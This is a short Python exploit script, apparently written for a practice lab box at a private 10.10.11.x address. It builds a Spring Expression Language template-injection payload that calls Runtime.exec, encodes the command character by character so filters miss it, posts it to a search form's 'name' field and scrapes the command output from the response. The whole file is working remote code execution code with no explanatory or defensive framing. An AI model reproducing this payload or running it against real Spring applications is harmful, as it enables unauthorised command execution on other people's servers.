from lxml import etree
import requests
import sys

####################################################################### command

COMMAND = sys.argv[1].encode('utf-8')

####################################################################### request

URL = 'http://10.10.11.170:8080/search'

############################################################ template injection

PAYLOAD_TEMPLATE = 'T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({}){}).getInputStream())'
ENCODING_TEMPLATE = '.concat(T(java.lang.Character).toString({}))'

def payload(cmd: bytes) -> str:
    return (
        '*{'
        + PAYLOAD_TEMPLATE.format(
            cmd[0],
            ''.join([ENCODING_TEMPLATE.format(b) for b in cmd[1:]]))
        + '}')

############################################################ parse the response

TARGET = '//div[@class="results"]/h2/text()'

def parse(response: str, path: str=TARGET) -> str:
    return etree.HTML(response).xpath(path)[0][18:]

x = requests.post(URL, data={'name': payload(COMMAND)})
print(parse(x.text))
